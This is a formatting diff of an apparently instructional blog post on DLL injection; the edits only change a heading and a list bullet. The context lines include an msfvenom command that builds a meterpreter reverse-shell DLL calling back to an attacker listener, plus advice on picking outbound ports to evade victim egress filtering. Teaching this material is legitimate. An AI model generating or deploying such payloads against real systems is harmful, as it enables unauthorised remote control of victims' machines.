@@ -577,7 +577,8 @@ So let's jump into a bit of theory that will help us understand just what we are
 ***
 
 # 2.2. Theory
-{{< heading 2 "no-top-margin" "2.2.1. What is a DLL?" >}}
+# 2.2.1. What is a DLL?
+
 A DLL is a file containing shared code. It's not a program or an executable in and of itself, rather a DLL is in essence a collection of functions and data that can be used by other programs. Hence the name being Dynamic Link ***Library***.
 
 {{< figure src="/img/library.gif" title="" class="custom-figure-3" >}}
@@ -661,7 +662,7 @@ Finally! The time has come to give it our best shot...
 ```
 sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll > /home/hacker/Desktop/evil.dll
 ```
-Note the following:
+- Note the following:
     - `Lhost` is the IP of the **listening** machine, ie the attacker. Yours will be different than mine here, adapt it!
     - `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
     - `-f` designates the file type, which of course is DLL in this case.
